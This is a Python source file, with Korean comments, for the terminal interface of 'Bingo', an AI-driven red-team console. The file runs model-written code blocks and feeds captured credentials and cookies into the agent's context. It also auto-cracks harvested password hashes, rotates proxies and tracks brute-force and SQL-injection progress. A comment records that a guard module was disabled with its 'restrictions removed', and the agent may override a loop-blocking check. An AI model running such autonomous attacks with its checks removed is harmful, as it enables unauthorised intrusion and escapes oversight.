from __future__ import annotations
import warnings as _warnings_global
# v6.2.52: prompt_toolkit sync prompt()가 asyncio 이벤트루프 충돌 시
# coroutine 객체가 GC 시점에 RuntimeWarning을 발생시킴 — 전역 억제
_warnings_global.filterwarnings(
    "ignore",
    message=r"coroutine.*was never awaited",
    category=RuntimeWarning,
)
_warnings_global.filterwarnings(
    "ignore",
    message=r"Enable tracemalloc",
    category=RuntimeWarning,
)
import os
import sys
import time
import threading
from datetime import datetime
from pathlib import Path
from typing import Iterator

from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.columns import Columns
from rich.table import Table
from rich.live import Live
from rich.spinner import Spinner
from rich.markdown import Markdown
from rich.markup import escape as _markup_escape
from rich.rule import Rule
from rich.prompt import Prompt
from prompt_toolkit import PromptSession
from prompt_toolkit.history import FileHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.styles import Style as PTStyle
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.completion import Completer, Completion, WordCompleter

from ..models.base import Message, StreamChunk
from ..lang.strings import get_strings, get_slash_commands, SUPPORTED_LANGS
from ..i18n import t
from ..proxy import ProxyManager


def _positive_int_env(
    name: str,
    default: int,
    *,
    minimum: int = 1,
    maximum: int = 86_400,
) -> int:
    """Return a bounded positive integer from the environment."""
    raw = os.environ.get(name)
    if raw is None:
        return default
    try:
        value = int(str(raw).strip())
    except (TypeError, ValueError):
        return default
    return max(minimum, min(value, maximum))


def _codeblock_exec_limits() -> tuple[int, int, int]:
    """Execution limits for markdown Python/Bash code blocks."""
    script_timeout = _positive_int_env("BINGO_EXEC_TIMEOUT", 180)
    idle_timeout = _positive_int_env(
        "BINGO_EXEC_IDLE_TIMEOUT",
        120,
        maximum=script_timeout,
    )
    wall_clock_timeout = _positive_int_env(
        "BINGO_EXEC_WALL_CLOCK_TIMEOUT",
        script_timeout + 30,
        minimum=script_timeout,
        maximum=86_430,
    )
    return script_timeout, idle_timeout, wall_clock_timeout


def _tool_call_from_mapping(
    value: object,
    known_tools: set[str],
    *,
    allow_flat: bool = False,
) -> str | None:
    """Convert a model-emitted tool mapping to Bingo's canonical wire format."""
    if not isinstance(value, dict):
        return None
    name = value.get("tool") or value.get("tool_name") or value.get("name")
    if not isinstance(name, str) or name not in known_tools:
        return None
    has_explicit_args = "args" in value or "arguments" in value or "parameters" in value
    # A generic API response may legitimately contain a top-level ``name``.
    # Require an argument wrapper unless the mapping explicitly says ``tool``.
    if "tool" not in value and "tool_name" not in value and not has_explicit_args and not allow_flat:
        return None
    if has_explicit_args:
        args = value.get("args", value.get("arguments", value.get("parameters", {})))
    else:
        args = {
            key: item
            for key, item in value.items()
            if key not in {"tool", "tool_name", "name"}
        }
    if not isinstance(args, dict):
        args = {}
    import json
    return "TOOL_CALL:" + json.dumps({"name": name, "args": args}, ensure_ascii=False)


def _normalize_tool_call_response(response: str) -> tuple[str, int]:
    """Silently normalize fenced dict/XML tool calls before execution parsing."""
    import ast
    import json
    import re

    try:
        from ..tools_ext.pentest_tools import TOOL_REGISTRY
        known_tools = set(TOOL_REGISTRY)
    except Exception:
        known_tools = set()
    if not known_tools:
        return response, 0

    converted = 0

    def _parse_mapping(raw: str) -> object | None:
        try:
            return json.loads(raw)
        except Exception:
            try:
                return ast.literal_eval(raw)
            except Exception:
                return None

    # The common failure mode is a Python/JSON fenced block containing only a
    # tool mapping. Replace the entire block so it is never treated as code.
    fence_pattern = re.compile(
        r"```(?:python|json)?[ \t]*\n(?P<body>.*?)```",
        re.DOTALL | re.IGNORECASE,
    )

    def _replace_fence(match: re.Match) -> str:
        nonlocal converted
        call = _tool_call_from_mapping(
            _parse_mapping(match.group("body").strip()),
            known_tools,
            allow_flat=True,
        )
        if call is None:
            return match.group(0)
        converted += 1
        return call

    response = fence_pattern.sub(_replace_fence, response)

    # Also accept a response that consists solely of a dict-form tool call.
    stripped = response.strip()
    if not re.search(r"TOOL_CALL\s*:", stripped):
        call = _tool_call_from_mapping(_parse_mapping(stripped), known_tools, allow_flat=True)
        if call is not None:
            return call, converted + 1
    return response, converted


def _repair_mixed_bash_python(script: str) -> tuple[str, bool]:
    """Wrap a valid Python suffix accidentally emitted inside a Bash block."""
    import ast
    import re

    lines = script.splitlines()
    if len(lines) < 2:
        return script, False

    protected: set[int] = set()
    heredoc_end: str | None = None
    python_quote: str | None = None
    for index, line in enumerate(lines):
        stripped = line.strip()
        if heredoc_end is not None:
            protected.add(index)
            if stripped == heredoc_end:
                heredoc_end = None
            continue
        if python_quote is not None:
            protected.add(index)
            if stripped in {python_quote, python_quote + ";"}:
                python_quote = None
            continue
        heredoc = re.search(r"\bpython3?\s+<<\s*['\"]?(\w+)['\"]?\s*$", line)
        if heredoc:
            heredoc_end = heredoc.group(1)
            protected.add(index)
            continue
        inline = re.search(r"\bpython3?\s+-c\s+(['\"])", line)
        if inline:
            quote = inline.group(1)
            remainder = line[inline.end():]
            protected.add(index)
            if quote not in remainder:
                python_quote = quote

    python_only = re.compile(
        r"^(?:"
        r"import\s+|from\s+\S+\s+import\s+|def\s+\w+\s*\(|class\s+\w+|"
        r"try\s*:|except\b|finally\s*:|with\s+.+:|for\s+.+\s+in\s+.+:|"
        r"if\s+.+:|elif\s+.+:|else\s*:|return\b|raise\b|assert\b|"
        r"print\s*\(|[A-Za-z_]\w*(?:\[[^]]+\])?\s+=\s+|"
        r"[A-Za-z_]\w*\s*,\s*[A-Za-z_]\w*\s*=\s+|"
        r"(?:re|json|requests|httpx|os|sys)\."
        r")"
    )

    for start, line in enumerate(lines):
        if start in protected or not python_only.match(line.strip()):
            continue
        if start > 0 and lines[start - 1].rstrip().endswith("|"):
            continue
        python_source = "\n".join(lines[start:]).strip()
        try:
            ast.parse(python_source)
        except SyntaxError:
            continue
        imports: list[str] = []
        for module in ("re", "json", "os", "sys"):
            if re.search(rf"\b{module}\.", python_source) and not re.search(
                rf"(?:^|\n)\s*(?:import\s+[^\n]*\b{module}\b|from\s+{module}\s+import\b)",
                python_source,
            ):
                imports.append(f"import {module}")
        if imports:
            python_source = "\n".join(imports) + "\n" + python_source
        marker = "BINGO_PY_AUTO"
        while marker in script:
            marker += "_X"
        wrapped = lines[:start] + [f"python3 << '{marker}'", python_source, marker]
        return "\n".join(wrapped), True
    return script, False


class _ToolThreadOutput:
    """Forward output except for one muted tool thread.

    ``sys.stdout`` is process-global, so the proxy must continue forwarding
    writes from the UI/main thread while suppressing only its owning worker.
    """

    def __init__(self, stream, owner: threading.Thread,
                 hint_active: threading.Event, muted: threading.Event) -> None:
        self._stream = stream
        self._owner = owner
        self._hint_active = hint_active
        self._muted = muted

    def _suppress(self) -> bool:
        return (
            threading.current_thread() is self._owner
            and (self._hint_active.is_set() or self._muted.is_set())
        )

    def write(self, data):
        if self._suppress():
            return len(data)
        return self._stream.write(data)

    def flush(self) -> None:
        if not self._suppress():
            self._stream.flush()

    def __getattr__(self, name):
        return getattr(self._stream, name)


# ── 응답 인코딩 자동 감지 유틸 ──────────────────────────────────────
def _decode_response(resp) -> str:
    """
    HTTP 응답을 올바른 인코딩으로 디코딩.
    우선순위: Content-Type 헤더 → HTML meta charset → chardet(선택) → apparent_encoding → utf-8 fallback
    EUC-KR, EUC-JP, GB2312, Shift-JIS 등 구형 인코딩 자동 처리.
    """
    import re as _re_enc

    raw = resp.content  # bytes

    # 1. Content-Type 헤더에서 charset 추출
    ct = resp.headers.get("Content-Type", "")
    _m = _re_enc.search(r"charset\s*=\s*([^\s;,\"']+)", ct, _re_enc.I)
    enc_from_header = _m.group(1).strip().lower() if _m else None

    # 2. HTML meta charset 추출 (헤더에 없을 경우)
    enc_from_meta = None
    if not enc_from_header:
        raw_sample = raw[:4096]
        for pat in [
            rb'charset\s*=\s*["\']?([a-zA-Z0-9_\-]+)',
            rb'<meta[^>]+content-type[^>]+charset=([a-zA-Z0-9_\-]+)',
        ]:
            _mm = _re_enc.search(pat, raw_sample, _re_enc.I)
            if _mm:
                enc_from_meta = _mm.group(1).decode("ascii", errors="ignore").strip().lower()
                break

    # 3. 인코딩 우선순위 결정
    enc = enc_from_header or enc_from_meta

    # 4. 별칭 정규화 (euc_kr → euc-kr 등 Python codec 호환)
    _alias_map = {
        "euc_kr": "euc-kr", "euckr": "euc-kr", "ks_c_5601": "euc-kr",
        "ks_c_5601-1987": "euc-kr", "ksc5601": "euc-kr",
        "euc_jp": "euc-jp", "eucjp": "euc-jp",
        "shift_jis": "shift-jis", "sjis": "shift-jis", "shift-jis": "shift_jis",
        "gb2312": "gb2312", "gbk": "gbk", "gb18030": "gb18030",
        "big5": "big5",
        "utf8": "utf-8", "utf_8": "utf-8",
        "latin1": "latin-1", "iso-8859-1": "latin-1",
    }
    if enc:
        enc = _alias_map.get(enc, enc)

    # 5. 디코딩 시도
    if enc:
        try:
            return raw.decode(enc, errors="replace")
        except (LookupError, UnicodeDecodeError):
            pass

    # 6. requests apparent_encoding 폴백
    apparent = getattr(resp, "apparent_encoding", None)
    if apparent:
        try:
            return raw.decode(apparent, errors="replace")
        except (LookupError, UnicodeDecodeError):
            pass

    # 7. 최후: utf-8 replace
    return raw.decode("utf-8", errors="replace")


# ── 색상 팔레트 (Bingo ops terminal theme) ───────────────────────
THEME = {
    "primary":   "#00ff88",   # terminal green
    "secondary": "#00d7ff",   # signal cyan
    "accent":    "#ff2bd6",   # magenta trace
    "dim":       "#627386",   # tactical slate
    "border":    "#16313d",   # low-contrast frame
    "user_bg":   "#0d1117",
    "ai_bg":     "#0d1117",
    "error":     "#ff1744",   # 크리티컬 레드
    "warn":      "#ffd600",   # 네온 옐로우
    "success":   "#00ff41",   # 성공 그린
    "info":      "#ce93d8",   # 라이트 퍼플 (정보)
    "critical":  "#ff1744",   # CRITICAL 취약점
    "high":      "#ffd600",   # HIGH 취약점
    "low":       "#00e5ff",   # LOW 취약점
}

BANNER = r"""
[#627386]━━[/] [#00ff88]bingo[/] [#627386]//[/] [#d7ffe8]red team operations console[/] [#627386]//[/] [#00d7ff]v{ver}[/] [#627386]//[/] [#ff2bd6]multi-model arsenal[/]
"""

PT_STYLE = PTStyle.from_dict({
    "":              "#00ff88",
    "prompt":        "#00ff88 bold",
    "prompt.brand":  "#00ff88 bold",
    "prompt.host":   "#00d7ff",
    "prompt.dim":    "#627386",
    "prompt.arrow":  "#ff2bd6 bold",
})


class _SlashCompleter(Completer):
    """/ 입력 시 슬래시 명령어 자동완성 (현재 언어 기준 설명)"""

    def __init__(self, lang_getter):
        # lang_getter: 현재 언어 코드를 반환하는 callable (lambda: self.config.lang)
        self._lang_getter = lang_getter

    def get_completions(self, document, complete_event):
        text = document.text_before_cursor
        if not text.startswith("/"):
            return
        word = text.split()[0] if text.split() else "/"
        commands = get_slash_commands(self._lang_getter())
        for cmd, desc in commands:
            if cmd.startswith(word) or word == "/":
                yield Completion(
                    cmd,
                    start_position=-len(word),
                    display=cmd,
                    display_meta=desc,
                )


def _filter_traceback(output: str):
    """v3.2.22: Python 스크립트 Traceback 폭탄 → 1줄 에러로 압축.

    Returns:
        (filtered_output: str, original_line_count: int, filtered_line_count: int)
        original_line_count == 0 이면 Traceback 없었음 (필터 미작동)
    """
    if "Traceback (most recent call last):" not in output:
        return output, 0, 0
    original_count = len(output.splitlines())
    lines = output.splitlines()
    result: list = []
    i = 0
    while i < len(lines):
        line = lines[i]
        stripped = line.strip()
        if stripped == "Traceback (most recent call last):":
            # Traceback 블록 — 예외 줄(들여쓰기 없고 ':'포함)이 나올 때까지 스킵
            j = i + 1
            exc_found = None
            while j < len(lines):
                l = lines[j]
                # "During handling..." 줄 → 이 블록 종료
                if l.startswith("During handling"):
                    break
                # 들여쓰기 없는 예외 줄
                if l and not l[0].isspace() and ":" in l:
                    exc_found = l.strip()
                    j += 1
                    break
                j += 1
            if exc_found:
                result.append(f"[错误] {exc_found}")
            i = j
        elif line.startswith("During handling of the above exception"):
            # 체인 예외 연결 문구 — 스킵
            i += 1
        else:
            result.append(line)
            i += 1
    filtered_output = "\n".join(result)
    filtered_count = len(result)
    return filtered_output, original_count, filtered_count


class BingoTerminal:
    """Bingo 메인 터미널 UI"""

    def __init__(self, config, strings: dict):
        self.config = config
        self.s = strings
        # 전역 i18n 언어 동기화
        try:
            from ..i18n import set_lang
            set_lang(getattr(config, "lang", "en"))
        except Exception:
            pass
        # v6.2.101/178: 자동 교정기 공지 언어 동기화 (기본 en — zh에서 한국어 누출 방지)
        try:
            from ..tools_ext.pentest_tools import set_notice_lang
            set_notice_lang(getattr(config, "lang", "en"))
        except Exception:
            pass

        # v6.2.178: self.s 값에 Hangul이 섞인 zh 누출 최종 방어
        try:
            from ..i18n import has_hangul, get_lang
            if get_lang() == "zh" or getattr(config, "lang", "") == "zh":
                from ..lang.strings import _STRINGS as _S_FIX
                for _sk, _sv in list(self.s.items()):
                    if isinstance(_sv, str) and has_hangul(_sv):
                        _en = (_S_FIX.get(_sk) or {}).get("en") or ""
                        if _en and not has_hangul(_en):
                            self.s[_sk] = _en
        except Exception:
            pass
        self.console = Console(highlight=False)
        self.history: list[Message] = []
        self._session: PromptSession | None = None
        # 자동 저장 경로 — 세션 시작 시 결정
        self._session_log_path: Path | None = None
        # 인증 세션 — /login 성공 시 저장, AI 컨텍스트에 자동 주입
        self._auth_session: dict = {
            "login_url": "",
            "username": "",
            "password": "",
            "cookies": {},      # {name: value}
            "evidence": "",     # VERIFIED / LIKELY / INFERRED
            "active": False,
        }
        # 자동 크랙 중단 플래그
        self._stop_crack_flag = threading.Event()
        # v6.2.169: 세션 하트비트 — 쿠키 만료 방지
        self._heartbeat_stop = threading.Event()
        self._heartbeat_thread: threading.Thread | None = None
        # 세션 내 해시 중복 크랙 방지 (파일명 캐시 버스팅 해시 포함)
        self._session_cracked_hashes: set = set()
        # v6.2.147: 에이전트 루프 중 수집한 해시 임시 큐 (스레드 인터리빙 방지)
        # _collect_crack_hashes()로 모아두고, 루프 완료 후 _notify_hashes_found()에서 한번에 크랙
        self._pending_crack_hashes: list = []
        # v6.2.148: API 에러 메시지 캐시 (Grok 403 자동 폴백 교정기용)
        self._last_stream_error: str = ""
        # Agent 루프 중단 플래그 (Ctrl+C)
        self._agent_stop_flag = threading.Event()
        # v6.2.182: hint 입력 중 — 백그라운드 도구/heartbeat 콘솔 출력 억제
        self._hint_input_active = threading.Event()
        self._active_tool_thread: threading.Thread | None = None
        # A cancelled Python worker cannot be killed safely. Serialize workers
        # so an old one must finish before a resumed loop starts another tool.
        self._tool_execution_lock = threading.Lock()
        # Agent 누적 상태 — 슬라이딩 윈도우에 잘려도 보존
        # v6.0.1: 프로세스 PID별 독립 파일 → 다중 터미널 동시 실행 시 상태 오염 방지
        import os as _os
        _state_dir = Path.home() / ".config" / "bingo"
        self._agent_state_path = _state_dir / f"agent_state_{_os.getpid()}.json"
        # 24시간 이상 된 stale agent_state 파일 자동 정리
        try:
            import time as _t
            for _f in _state_dir.glob("agent_state_*.json"):
                if _t.time() - _f.stat().st_mtime > 86400:
                    _f.unlink(missing_ok=True)
        except Exception:
            pass
        self._agent_state: dict = self._load_agent_state()
        # ── 화이트박스 분석 상태 (v3.2.82) ────────────────────────────
        self._whitebox_context: str = ""          # AI에 주입할 화이트박스 컨텍스트
        self._whitebox_result = None              # WhiteboxResult 객체
        # ── Proof-by-exploitation 리포트 ────────────────────────────
        from ..core.vuln_agents import ProofReport
        self._proof_report = ProofReport()
        # ── v3.2.96: 실시간 발견 자동 저장 ──────────────────────────
        from ..tools.findings_exporter import FindingsExporter
        self._findings_exporter = FindingsExporter(
            target=getattr(self._agent_state, "get", lambda k, d=None: d)("target", "")
        )
        # ── 전담 에이전트 계획 ─────────────────────────────────────
        self._agent_plan = None                   # AgentPlan 객체
        # 롤백 매니저
        from ..core.rollback import RollbackManager
        self._rollback = RollbackManager()
        # 파일시스템 감시
        from ..core.file_watcher import AgentOutputWatcher
        self._file_watcher = AgentOutputWatcher(console=self.console)
        self._file_watcher.start()
        # Code-change memory: install the post-commit hook and backfill HEAD.
        # Run in the background so terminal startup never waits on Git I/O.
        try:
            from ..core.change_memory import watch_worktree_changes as _watch_change_memory
            threading.Thread(
                target=_watch_change_memory,
                args=(Path.cwd(),),
                daemon=True,
                name="bingo-change-memory",
            ).start()
        except Exception:
            pass
        # 토큰 / 비용 추적
        self._token_usage: dict = {"prompt": 0, "completion": 0, "total": 0}
        self._cost_usd: float = 0.0
        # Agent 루프 카운터 — 슬라이딩 윈도우 영향 받지 않는 전용 카운터
        self._exec_loop_count: int = 0
        # Stuck 감지 — 마지막 N개 결과의 해시값 (반복 시 자동 전략 전환)
        self._recent_results: list[str] = []
        self._stuck_count: int = 0
        # ── v6.2.151 Doom Loop 감지기 (bingo 자체 설계) ──────────────────
        # 최근 도구 호출 시그니처 목록 (이름+인자 해시) — 반복 패턴 감지용
        self._dl_tool_sigs: list[str] = []
        self._dl_no_progress: int = 0       # 연속 "진전 없음" 루프 수
        self._dl_progress_sigs: set[str] = set()
        self._dl_escape_attempts: int = 0
        # ── v6.2.151 2-pass Compaction 상태 ──────────────────────────────
        self._compaction_summary: str = ""  # 배경 LLM 생성 요약
        self._compaction_lock = __import__("threading").Lock()
        self._compaction_running: bool = False
        self._compaction_threshold: int = 40  # 히스토리 메시지 수 임계값
        # ── v6.2.159 Intelligence Engine (SubAgent/TaskGraph/Self-Reflection) ─
        try:
            from ..core.intelligence import SubAgentPool, TaskGraph, SelfReflector
            self._subagent_pool = SubAgentPool()
            self._task_graph = TaskGraph()
            self._self_reflector = SelfReflector()
            self._intel_ready = True
        except Exception:
            self._intel_ready = False
        # 네트워크 환경 (VPN 감지 결과 캐싱)
        self._net_env: dict = {}
        self._detect_network_env()

        # /retry 용 마지막 실행 결과 캐시
        self._last_exec_result: str = ""
        # 현재 세션에서 실제 확인된 항목 (이전 세션 carry-over 구분용)
        # ↳ 보고서 환각 방지: 보고서에는 이 목록 기준으로 현재 세션 확인 여부를 AI에게 전달
        self._session_tables: list[str] = []
        self._session_credentials: list[dict] = []
        self._session_fresh: bool = True   # True = 새 세션, False = 이전 세션 복원
        # 프록시 풀 로테이션 관리자 (v3.2.18)
        self._proxy: ProxyManager = ProxyManager()
        # v3.2.77: 이전 세션 프록시 풀 자동 복원
        _proxy_restored = self._proxy.load_config()
        if _proxy_restored > 0:
            pass  # 복원 성공 (배너는 _start_banner에서 출력)
        # v3.2.80: 프록시 교체 알림 콜백 등록
        self._proxy.on_switch = self._on_proxy_switched
        # ── v3.2.71 추가 ────────────────────────────────────────────────
        # 브루트포스 연속 실패 카운터 (자동 포기 + 벡터 전환용)
        self._bruteforce_fail_count: int = 0
        self._bruteforce_abort_triggered: bool = False
        self._loop_block_consecutive: int = 0  # v3.2.91: LOOP_BLOCK 연속 차단 카운터 (무한사이클 방지)
        self._ilr_consecutive: int = 0         # v3.2.94: INFINITE_LOOP_RISK 전용 연속 카운터
        self._ilr_override: bool = False       # v3.2.94: ILR 3회 연속 차단 후 override 허용 플래그
        # v6.2.20: PhantomGuard disabled — restrictions removed, kept only for VPN check
        self._phantom_guard = None  # type: ignore[assignment]
        # 도메인별 메모리 모듈 (target_memory)
        try:
            from ..core.target_memory import load as _tm_load, save as _tm_save, \
                record_sqli_point as _tm_sqli, record_users as _tm_users, \
                record_endpoint as _tm_ep, build_context_injection as _tm_ctx, \
                purge_foreign_domains as _tm_purge
            self._tm_load = _tm_load
            self._tm_save = _tm_save
            self._tm_sqli = _tm_sqli
            self._tm_users = _tm_users
            self._tm_ep = _tm_ep
            self._tm_ctx = _tm_ctx
            self._tm_purge = _tm_purge
            self._tm_available = True
        except Exception:
            self._tm_available = False
        # 세션 로그 자동 파싱 모듈 (session_parser) — v3.2.72
        try:
            from ..core.session_parser import parse_and_save_to_memory as _sp_parse
            self._sp_parse = _sp_parse
            self._sp_available = True
        except Exception:
            self._sp_available = False

    # ── 네트워크 환경 감지 (VPN 자동 판단) ───────────────────────
    def _detect_network_env(self) -> None:
        """VPN 사용 여부를 자동 판단하고 실제 출구 IP를 조회."""
        import socket, threading

        def _probe():
            result = {
                "local_ip": "",
                "public_ip": "",
                "vpn_detected": False,
                "vpn_interface": "",
                "country": "",
            }
            try:
                # 로컬 IP 조회 (DNS 쿼리 방식 — 실제 연결 없이)
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as _s:
                    _s.connect(("8.8.8.8", 80))
                    result["local_ip"] = _s.getsockname()[0]
            except Exception:
                result["local_ip"] = "unknown"

            # VPN 판단: 로컬 IP가 tun/vpn 대역인지 확인
            _lip = result["local_ip"]
            _vpn_ranges = [
                ("10.", "Private/VPN"),
                ("172.16.", "VPN"),("172.17.", "VPN"),("172.18.", "VPN"),
                ("172.19.", "VPN"),("172.20.", "VPN"),("172.30.", "VPN"),
                ("172.31.", "VPN"),
                ("100.64.", "Tailscale/VPN"),("100.65.", "Tailscale/VPN"),
                ("100.100.", "Tailscale/VPN"),
                # ★ v3.5.16: 198.18.0.0/15 — macOS VPN 가상 IP 대역
                # DNS가 이 대역을 반환하면 실제 서버 IP가 아님 (VPN 프록시 경유)
                # → 포트스캔 결과 전체 무효화 필요
                ("198.18.", "macOS-VPN-virtual"),
                ("198.19.", "macOS-VPN-virtual"),
            ]
            # 192.168.x.x 는 일반 공유기도 포함이므로 별도 체크
            _is_192 = _lip.startswith("192.168.")

            vpn_hint = ""
            _is_macos_vpn_virtual = False
            for prefix, label in _vpn_ranges:
                if _lip.startswith(prefix):
                    vpn_hint = label
                    if "macOS-VPN-virtual" in label:
                        _is_macos_vpn_virtual = True
                    break

            # ★ v3.5.16: 198.18.x.x 감지 → net_env에 플래그 기록
            result["macos_vpn_dns_spoof"] = _is_macos_vpn_virtual

            # 외부 API로 실제 출구 IP 조회 (여러 서비스 폴백)
            _public_ip = ""
            _country = ""
            _ip_apis = [
                "https://api.ipify.org",
                "https://ipv4.icanhazip.com",
                "https://api4.my-ip.io/ip",
                "https://checkip.amazonaws.com",
            ]
            import ssl as _ssl, urllib.request as _ur
            _ctx = _ssl.create_default_context()
            _ctx.check_hostname = False
            _ctx.verify_mode = _ssl.CERT_NONE
            for _api in _ip_apis:
                try:
                    _req = _ur.Request(_api, headers={"User-Agent": "curl/7.88.1"})
                    with _ur.urlopen(_req, timeout=4, context=_ctx) as _r:
                        _public_ip = _r.read().decode().strip().split("\n")[0]
                    if _public_ip:
                        break
                except Exception:
                    continue

            # 국가 정보 조회 (ip-api.com)
            if _public_ip:
                try:
                    _cr = _ur.Request(
                        f"http://ip-api.com/json/{_public_ip}?fields=country,countryCode,isp",
                        headers={"User-Agent": "curl/7.88.1"}
                    )
                    import json as _json
                    with _ur.urlopen(_cr, timeout=4) as _cr_resp:
                        _geo = _json.loads(_cr_resp.read().decode())
                    _country = f"{_geo.get('countryCode','?')} / {_geo.get('isp','')[:30]}"
                except Exception:
                    _country = ""

            result["public_ip"] = _public_ip
            result["country"] = _country

            # VPN 최종 판단: 로컬 IP ≠ 공개 IP 이면서 VPN 대역 OR tun 인터페이스 존재
            _is_vpn = False
            _vpn_iface = ""
            try:
                import subprocess as _sp
                _ifout = _sp.check_output(["ifconfig"], text=True, timeout=3)
                for _iface_name in ("tun", "tap", "utun", "wg", "vpn", "ppp", "ipsec"):
                    if _iface_name in _ifout.lower():
                        _is_vpn = True
                        _vpn_iface = _iface_name
                        break
            except Exception:
                pass

            if vpn_hint:
                _is_vpn = True
                _vpn_iface = vpn_hint

            # 공개 IP가 로컬 IP와 다른 경우 (NAT/VPN)
            if _public_ip and _public_ip != _lip and not _lip.startswith("192.168."):
                _is_vpn = True

            result["vpn_detected"] = _is_vpn
            result["vpn_interface"] = _vpn_iface
            self._net_env = result

        # 백그라운드에서 조회 (시작 속도에 영향 없음)
        threading.Thread(target=_probe, daemon=True).start()

    def _get_net_env_line(self) -> str:
        """배너/상태줄용 네트워크 환경 한 줄 요약"""
        env = self._net_env
        if not env:
            return ""
        pub = env.get("public_ip", "")
        local = env.get("local_ip", "")
        vpn = env.get("vpn_detected", False)
        iface = env.get("vpn_interface", "")
        country = env.get("country", "")

        if vpn:
            _txt = self.s.get("vpn_on_banner", "🔒 VPN ON  Exit IP: {ip}  {country}  (local: {local})")
            _line = f"[{THEME['warn']}]{_txt.format(ip=pub, country=country, local=local)}[/]"
            # ★ v3.5.16: 198.18.x.x 가상 IP 경고
            if env.get("macos_vpn_dns_spoof"):
                _warn = self.s.get(
                    "vpn_dns_spoof_warn",
                    "⚠️  VPN DNS spoof detected (198.18.x.x) — DNS lookups return FAKE IPs. Port scan results will be INVALID. Disable VPN for real IPs."
                )
                _line += f"\n[{THEME['error']}]{_warn}[/]"
            return _line
        elif pub:
            _txt = self.s.get("vpn_off_banner", "🌐 Public IP: {ip}  {country}")
            return f"[{THEME['dim']}]{_txt.format(ip=pub, country=country)}[/]"
        return ""

    # ── 공개 진입점 ───────────────────────────────────────────────
    def run(self) -> None:
        import signal

        # Ctrl+C → 에이전트 루프 안전 중단 (프로그램 종료 아님)
        def _sigint_handler(sig, frame):
            # ★ /orch 모드: 백그라운드 오케스트레이터 스레드도 함께 중단
            try:
                from ..orchestrator.engine import global_orchestrator as _g_orch_sig
                _orch_sig = _g_orch_sig()
                if _orch_sig and _orch_sig.running:
                    _orch_sig.stop()
            except Exception:
                pass

            if self._agent_stop_flag.is_set():
                # 두 번 누르면 완전 종료
                # (stderr 사용 — Live/Rich 컨텍스트와 충돌 없음)
                import sys as _sys
                _sys.stderr.write("\n⚡ Force quit\n")
                _sys.stderr.flush()
                raise SystemExit(0)
            self._agent_stop_flag.set()
            self._stop_crack_flag.set()
            # ★ 메시지는 stderr로 — Live(transient=True) 컨텍스트에 의해 지워지지 않음
            import sys as _sys
            _smap = getattr(self, "s", None) or {}
            _cc_msg = _smap.get("ctrl_c_stream_stopping") if isinstance(_smap, dict) else None
            if not _cc_msg:
                _lang_cc = getattr(getattr(self, "config", None), "lang", "en")
                _cc_msg = {
                    "ko": "⚠  Ctrl+C — 스트림 중단 중...",
                    "zh": "⚠  Ctrl+C — 正在中断流...",
                    "en": "⚠  Ctrl+C — stopping stream...",
                }.get(_lang_cc, "⚠  Ctrl+C — stopping stream...")
            _sys.stderr.write(f"\n{_cc_msg}\n")
            _sys.stderr.flush()

        signal.signal(signal.SIGINT, _sigint_handler)

        self._clear()
        self._print_banner()
        self._init_session()

        # ★ v3.5.14: HITL 메인-스레드 위임 브리지 등록
        # 백그라운드 스레드(오케스트레이터)가 HITL 입력을 요청할 때
        # session.app.exit(HITL_SENTINEL)을 통해 메인 스레드 prompt를 인터럽트
        try:
            from ..hitl.gate import register_interrupt_fn as _reg_hitl_fn, HITL_SENTINEL as _HS
            def _hitl_interrupt_fn():
                try:
                    if self._session and self._session.app:
                        self._session.app.exit(result=_HS)
                except Exception:
                    pass
            _reg_hitl_fn(_hitl_interrupt_fn)
        except Exception:
            pass

        self._init_session_log()

        # v3.2.77: 이전 세션 프록시 복원 알림
        _proxy_count = self._proxy.pool_status().get("total", 0)
        if _proxy_count > 0:
            _lang = getattr(self.config, "lang", "en")
            _proxy_restore_msg = {
                "ko": f"🔁 이전 세션 프록시 {_proxy_count}개 복원됨 (/proxy list 로 확인)",
                "zh": f"🔁 已恢复上次会话代理 {_proxy_count} 个 (使用 /proxy list 查看)",
                "en": f"🔁 Restored {_proxy_count} proxies from last session (/proxy list to view)",
            }.get(_lang, f"🔁 Restored {_proxy_count} proxies from last session")
            self.console.print(f"[dim]{_proxy_restore_msg}[/dim]")


        if not self.config.get_active_model_config():
            self._warn(self.s["no_model_configured"])
            self._cmd_model()

        # ── v6.2.151 autoDream: 조건 충족 시 배경 세션 통합 ──────────────────
        try:
            from ..core.memory import auto_dream as _auto_dream
            import threading as _ad_th
            _ad_th.Thread(
                target=_auto_dream,
                kwargs={"lang": getattr(self.config, "lang", "en")},
                daemon=True,
                name="bingo-autodream",
            ).start()
        except Exception:
            pass
        # ─────────────────────────────────────────────────────────────────────

        # ── v6.2.151 autoDream: 타겟 관련 이전 기억 주입 ─────────────────────
        try:
            from ..core.memory import inject_context as _mem_inject
            _mem_target = self._agent_state.get("target", "")
            if _mem_target:
                _mem_ctx = _mem_inject(_mem_target, lang=getattr(self.config, "lang", "en"))
                if _mem_ctx:
                    # 시스템 메시지 뒤에 메모리 컨텍스트 주입
                    self.history.insert(0, Message(role="user", content=_mem_ctx))
                    self.history.insert(1, Message(
                        role="assistant",
                        content={
                            "ko": "이전 세션 기억을 불러왔습니다. 계속 진행하겠습니다.",
                            "zh": "已加载历史会话记忆，继续执行。",
                            "en": "Previous session memory loaded. Continuing.",
                        }.get(getattr(self.config, "lang", "en"), "Memory loaded."),
                    ))
        except Exception:
            pass
        # ─────────────────────────────────────────────────────────────────────

        # 이전 세션 이어하기 제안
        _resumed = self._offer_resume()

        self._inject_warmup_history()

        if _resumed:
            # 복원된 경우 → 자동으로 에이전트 재개 메시지 주입
            _lang = getattr(self.config, "lang", "en")
            _auto_continue = {
                "ko": f"이전 작업을 이어서 계속 진행해 주세요. 타겟: {self._agent_state.get('target') or ''}",
                "zh": f"请继续上次未完成的工作。目标: {self._agent_state.get('target') or ''}",
                "en": f"Continue the previous task from where it was left off. Target: {self._agent_state.get('target') or ''}",
            }.get(_lang, "Continue previous task.")
            # 자동 재개 — chat_loop 거치지 않고 직접 AI 호출
            from ..models.registry import ModelRegistry
            model_cfg = self.config.get_active_model_config()
            if model_cfg:
                self.history.append(Message(role="user", content=_auto_continue))
                self._append_to_session_log("user", _auto_continue)
                model = ModelRegistry.build(model_cfg)
                response = self._stream_response(
                    model.chat_stream(self._build_messages(""))
                )
                if response:
                    self.history.append(Message(role="assistant", content=response))
                    self._append_to_session_log("assistant", response)
